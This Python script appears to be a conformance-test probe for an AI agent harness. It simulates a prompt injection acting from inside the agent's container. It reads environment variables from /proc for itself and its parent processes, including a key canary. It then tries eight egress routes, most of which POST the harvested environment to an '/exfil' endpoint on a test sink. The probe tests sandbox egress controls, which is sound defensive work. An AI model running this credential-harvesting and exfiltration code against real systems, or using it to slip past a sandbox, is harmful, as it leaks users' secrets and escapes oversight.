#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""The probe of case 9 of gates/harness-conformance.sh (docs/adr/0046): what an
injection in repository content could do from inside the harness's container.
Run by the scripted model as `python3 probe.py <stub's default IP> [<stub port>]`,
in the workspace, under the CLI's own shell tool, so it has the container's
environment, key included, and nothing more.

It reads /proc/self/environ (the key canary is in it; and that of every process
above it, because a CLI may scrub the key from the environment of the commands
it runs, while an injection would read the CLI's own) and tries to send it out
eight ways, one line each, `egress-probe <channel> blocked|open`, and nothing
else on stdout: never what it read. `open` means the way out worked.

  a  POST http://conformance-sink:<port>/exfil through the proxy
  b  CONNECT conformance-sink:<port> through the proxy
  c  CONNECT conformance-model:<port + 1> through the proxy (a name the
     allowlist holds, on a port it does not: decision, any port the stub does
     not serve)
  d  CONNECT example.com:443 through the proxy (decision: the IANA documentation
     domain)
  e  TCP to conformance-sink:<port>, no proxy
  f  TCP to the stub's own address on `default`, no proxy
  g  TCP to 1.1.1.1:443, no proxy (decision: a public anycast address)
  h  resolve example.com

Timeouts: 5 s per channel (decision: a local listener answers in far less, and
eight fit well under the role's TIMEOUT_S). (g) and (h) prove something only on
a host with internet.

How a proxied channel reads. The proxy (core/egress.py) refuses with its own
`403` whose body starts `egress:`; that, or a proxy that cannot be reached at all
or closes without an answer, is `blocked`. Anything else is `open`: a 200, a 502
(the proxy tried to connect, so its list let the host through), another server's
error page, or silence (the proxy is dialling out). An HTTP error is not a
refusal: some server answered. When a tunnel opens or a direct connection
succeeds, the probe also sends a POST to /exfil with the environment it read, so
the stub records the leak; the suite then fails twice over.

An unexpected exception is not `blocked`: it ends the probe with a traceback and
a missing line, which the suite refuses. Only network errors (OSError) are
read as a way that is shut.

Python standard library only.
"""
import os
import socket
import sys
import threading
from urllib.parse import urlsplit

TIMEOUT_S = 5
SINK = "conformance-sink"
MODEL = "conformance-model"
PUBLIC_IP = "1.1.1.1"
PUBLIC_NAME = "example.com"
REFUSAL = b"HTTP/1.1 403 "
REFUSAL_BODY = b"egress:"


def environment():
    """This process's environment, then each parent's up to pid 1, whatever can be read."""
    data, pid, seen = b"", "self", set()
    while pid and pid != "0" and pid not in seen:
        seen.add(pid)
        try:
            with open("/proc/%s/environ" % pid, "rb") as f:
                data += f.read()
        except OSError:
            pass
        try:
            with open("/proc/%s/stat" % pid) as f:
                pid = f.read().rsplit(")", 1)[1].split()[1]
        except (OSError, IndexError):
            break
    return data


def proxy_address():
    """The proxy the container's environment names, as a client would read it."""
    url = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy") or "http://egress:3128"
    u = urlsplit(url)
    return u.hostname, u.port or 3128


def post(target, host, body):
    head = ("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/octet-stream\r\n"
            "Content-Length: %d\r\nConnection: close\r\n\r\n" % (target, host, len(body)))
    return head.encode() + body


def read_answer(s):
    """What the far end said first: its head and the start of a body; b"" when it
    closed or reset without saying anything; None when it said nothing in time."""
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            _, sep, body = data.partition(b"\r\n\r\n")
            # The head is whole; only a refusal's body is needed (its first words).
            if sep and (not data.startswith(REFUSAL) or len(body) >= len(REFUSAL_BODY)):
                break
    except socket.timeout:
        return data or None
    except OSError:
        return data
    return data


def refused(answer):
    """The proxy's own refusal, or no answer at all from a proxy that closed."""
    if answer is None:
        return False
    if answer == b"":
        return True
    _, _, body = answer.partition(b"\r\n\r\n")
    return answer.startswith(REFUSAL) and body.startswith(REFUSAL_BODY)


def via_proxy(request, then=b""):
    """True when the proxy did not refuse `request`. `then` is sent when a tunnel opens."""
    try:
        s = socket.create_connection(proxy_address(), timeout=TIMEOUT_S)
    except OSError:
        return False
    with s:
        try:
            s.sendall(request)
        except OSError:
            return False
        answer = read_answer(s)
        if then and answer is not None and answer.startswith(b"HTTP/1.1 200"):
            try:
                s.sendall(then)
                read_answer(s)
            except OSError:
                pass
    return not refused(answer)


def connect_through(host, port, then=b""):
    request = "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n" % (host, port, host, port)
    return via_proxy(request.encode(), then)


def direct(host, port, then=b""):
    """True when a TCP connection to host:port, no proxy, succeeds."""
    try:
        s = socket.create_connection((host, port), timeout=TIMEOUT_S)
    except OSError:
        return False
    with s:
        if then:
            try:
                s.sendall(then)
                read_answer(s)
            except OSError:
                pass
    return True


def resolves(name):
    """getaddrinfo has no timeout: ask from a thread and stop waiting after 5 s."""
    answer = []

    def ask():
        try:
            socket.getaddrinfo(name, 443)
            answer.append(True)
        except OSError:
            answer.append(False)

    t = threading.Thread(target=ask, daemon=True)
    t.start()
    t.join(TIMEOUT_S)
    return bool(answer and answer[0])


def main():
    if len(sys.argv) < 2:
        sys.exit("usage: probe.py <the stub's address on default> [<stub port>]")
    stub_ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8089
    secret = environment()
    exfil = post("/exfil", "%s:%d" % (SINK, port), secret)
    channels = [
        ("a", lambda: via_proxy(post("http://%s:%d/exfil" % (SINK, port), "%s:%d" % (SINK, port), secret))),
        ("b", lambda: connect_through(SINK, port, exfil)),
        ("c", lambda: connect_through(MODEL, port + 1)),
        ("d", lambda: connect_through(PUBLIC_NAME, 443)),
        ("e", lambda: direct(SINK, port, exfil)),
        ("f", lambda: direct(stub_ip, port, post("/exfil", "%s:%d" % (stub_ip, port), secret))),
        ("g", lambda: direct(PUBLIC_IP, 443)),
        ("h", lambda: resolves(PUBLIC_NAME)),
    ]
    for channel, attempt in channels:
        print("egress-probe %s %s" % (channel, "open" if attempt() else "blocked"), flush=True)


if __name__ == "__main__":
    main()
